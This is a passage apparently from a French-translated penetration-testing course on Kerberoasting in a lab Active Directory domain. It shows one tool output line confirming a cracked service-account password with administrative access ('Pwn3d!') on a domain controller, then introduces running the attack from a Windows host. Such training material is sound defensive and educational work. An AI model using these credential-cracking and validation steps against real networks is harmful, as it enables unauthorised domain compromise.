SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\sqldev:database! (Pwn3d!

```

* * * * *

Plus de torréfaction
--------------------

Maintenant que nous avons couvert Kerberoasting à partir d'un hôte d'attaque Linux, nous allons passer par le processus à partir d'un hôte Windows. Nous pouvons décider d'effectuer une partie ou la totalité de nos tests à partir d'un hôte Windows, notre client peut nous fournir un hôte Windows à partir duquel tester, ou nous pouvons compromettre un hôte et devoir l'utiliser comme point de départ pour d'autres attaques. Quelle que soit la façon dont nous utilisons les hôtes Windows lors de nos évaluations, pour rester polyvalent, il est essentiel de comprendre comment effectuer autant d'attaques que possible à partir des hôtes Linux et Windows, car nous ne savons jamais ce que nous aurons jeté sur nous à partir d'une évaluation à un autre.
